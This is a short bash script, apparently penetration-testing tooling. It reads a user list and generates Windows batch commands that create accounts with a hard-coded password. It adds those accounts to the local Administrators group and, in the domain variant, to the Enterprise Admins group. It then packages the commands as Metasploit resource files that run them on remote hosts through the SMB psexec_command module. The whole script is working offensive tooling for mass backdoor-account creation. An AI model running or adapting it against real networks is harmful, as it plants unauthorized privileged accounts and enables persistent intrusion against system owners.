#!/bin/bash
#by bluescreenofjeff
IFS=$'\n'
USERLISTFILE='/root/Desktop/users.txt'
PASSVAR='StrongPassword1'
OUTFILELOCAL='mass_user_add_local.rc'
OUTBATLOCAL='mass_user_add_local.bat'
OUTFILEDOMAIN='mass_user_add_domain.rc'
OUTBATDOMAIN='mass_user_add_domain.bat'

#BAT Output - local
for CURRUSER in `cat $USERLISTFILE`
do
	echo net user $CURRUSER /add /active:yes\ >> $OUTBATLOCAL
	echo net user $CURRUSER $PASSVAR >> $OUTBATLOCAL
	echo net localgroup  administrators $CURRUSER  /add >> $OUTBATLOCAL
done

#BAT to RC - local
echo 'use auxiliary/admin/smb/psexec_command' >> $OUTFILELOCAL
for EACH in `cat $OUTBATLOCAL`
do
	echo set command \" $EACH \" >> $OUTFILELOCAL
	echo run >> $OUTFILELOCAL
done


#BAT Output - domain
for CURRUSER in `cat $USERLISTFILE`
do
	echo net user $CURRUSER /add /active:yes /domain >> $OUTBATDOMAIN
	echo net user $CURRUSER $PASSVAR /domain >> $OUTBATDOMAIN
	echo net localgroup  administrators $CURRUSER  /add /domain >> $OUTBATDOMAIN
	echo net group "Enterprise Admins"  $CURRUSER /add /domain >> $OUTBATDOMAIN
	echo net group "Enterprise Admins"  $CURRUSER /add /domain >> $OUTBATDOMAIN
done

#BAT to RC - domain
echo 'use auxiliary/admin/smb/psexec_command' >> $OUTFILEDOMAIN
for EACH in `cat $OUTBATDOMAIN`
do
	echo set command \" $EACH \" >> $OUTFILEDOMAIN
	echo run >> $OUTFILEDOMAIN
done
 